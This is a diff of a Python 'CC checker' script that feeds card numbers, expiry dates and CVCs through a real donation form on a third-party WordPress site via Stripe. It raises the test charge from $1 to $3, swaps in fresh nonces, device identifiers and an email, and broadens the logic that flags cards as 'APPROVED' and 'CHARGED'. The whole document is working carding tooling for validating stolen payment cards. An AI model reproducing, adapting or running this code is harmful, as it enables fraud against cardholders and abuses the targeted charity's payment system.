@@ -15,14 +15,14 @@ dev = "@mhitzxg"
 
 # Configuration - YOUR ORIGINAL CONFIG
 pkk = 'pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
-fn = '2d74654657' 
+fn = '1de97190f1' 
 aj = 'https://allcoughedup.com/wp-admin/admin-ajax.php'
 ref = 'https://allcoughedup.com/registry/'
 
 # Website identifiers - YOUR ORIGINAL
-guid = 'beed82b8-9f7d-4585-8162-8fa6d92c010c1b6c9b'
-muid = 'c70ee7f6-0caf-4555-b545-a1c2d4ee30eb88e211'
-sid = 'a1772a92-62c1-4d2e-b5c3-e4939a09a4737b9bc9'
+guid = '9c9214ea-4d1c-4b4d-a6b8-4c5c2f38336a6ee181'
+muid = '3eaee6a6-74c8-40e8-a8fa-ea732400f76c549367'
+sid = '5e112444-6f7d-4ebf-9307-7e4ec16dc6be3601bf'
 
 # User agent - YOUR ORIGINAL
 us = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
@@ -218,7 +218,7 @@ def extract_error_from_response(response_text):
             if isinstance(data, dict):
                 # Check for success message
                 if data.get('success') == True:
-                    return "CHARGED 1$"
+                    return "CHARGED 3$"
                 
                 # Check for error in different formats
                 if 'error' in data:
@@ -348,7 +348,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ BIN BANNED ❌
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -445,7 +445,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -471,7 +471,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -487,7 +487,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -502,7 +502,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -526,7 +526,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -542,7 +542,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -557,7 +557,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -577,7 +577,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -594,7 +594,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -635,7 +635,7 @@ def test_charge(cc_line):
             'data': (
                 f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce={fn}&'
                 f'_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=diwas%20Khatri&'
-                f'email=diwass%40khatriiaol.com&custom-payment-amount=1&'
+                f'email=mhitzxg%40mechanicspedia.com&custom-payment-amount=3&'
                 f'description=Thanks%20%3A-%20%40zx&payment_method=stripe&'
                 f'__stripe_payment_method_id={payment_method_id}'
             ),
@@ -693,7 +693,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -716,44 +716,68 @@ def test_charge(cc_line):
         if final_message.startswith(','):
             final_message = final_message[1:].strip()
         
-        # Check for success (CHARGED 1$ should only show when actually charged)
+        # Check for success (CHARGED 3$ should only show when actually charged)
         ajax_response_lower = ajax_response_text.lower()
         
-        # Debug: Print raw response for troubleshooting
-        print(f"DEBUG - Raw AJAX response: {ajax_response_text[:200]}...")
-        
-        # Only show "CHARGED 1$" when we have actual success
+        # Only show "CHARGED 3$" when we have actual successful charge
         is_success = False
         success_indicators = [
             '"success":true',
             'payment successful',
             'thank you for your payment',
             'transaction successful',
-            '<p>Thank You! <br />Your gift means so much to us!</p>',
             'payment approved',
             'charge successful',
+            'your payment has been processed',
+            'payment completed',
+            'payment accepted',
+            'thank you! your gift',
+            'payment was successful',
         ]
-        
+
         for indicator in success_indicators:
             if indicator in ajax_response_lower:
                 is_success = True
                 break
-        
+
         # Also check JSON structure
         try:
             ajax_json = json.loads(ajax_response_text)
-            if isinstance(ajax_json, dict) and ajax_json.get('success') == True:
-                is_success = True
+            if isinstance(ajax_json, dict):
+                if ajax_json.get('success') == True:
+                    is_success = True
+                elif ajax_json.get('status') == 'success':
+                    is_success = True
+                elif ajax_json.get('result') == 'success':
+                    is_success = True
+                elif ajax_json.get('payment_status') == 'succeeded':
+                    is_success = True
+                    
+                if ajax_json.get('data'):
+                    data = ajax_json['data']
+                    if isinstance(data, dict):
+                        if data.get('success') == True:
+                            is_success = True
+                        elif data.get('status') == 'success':
+                            is_success = True
         except:
             pass
-        
+
+        # SAFETY CHECK: If decline indicators present, it's NOT charged
+        if is_success:
+            decline_indicators = ['declined', 'error', 'failed', 'invalid']
+            for indicator in decline_indicators:
+                if indicator in ajax_response_lower:
+                    is_success = False
+                    break
+
         if is_success:
             return f"""
 ✅ APPROVED CC
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 1$🔥
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 3$ 🔥 - Payment Successful!
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -770,7 +794,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -786,7 +810,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -802,7 +826,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message if final_message else 'Card declined'}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
 🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
@@ -819,7 +843,7 @@ def test_charge(cc_line):
 
 💳𝗖𝗖 ⇾ {cc_line.strip()}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 3$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: Unknown - Unknown - Unknown
 🏛️𝗕𝗮𝗻𝗸: Unavailable
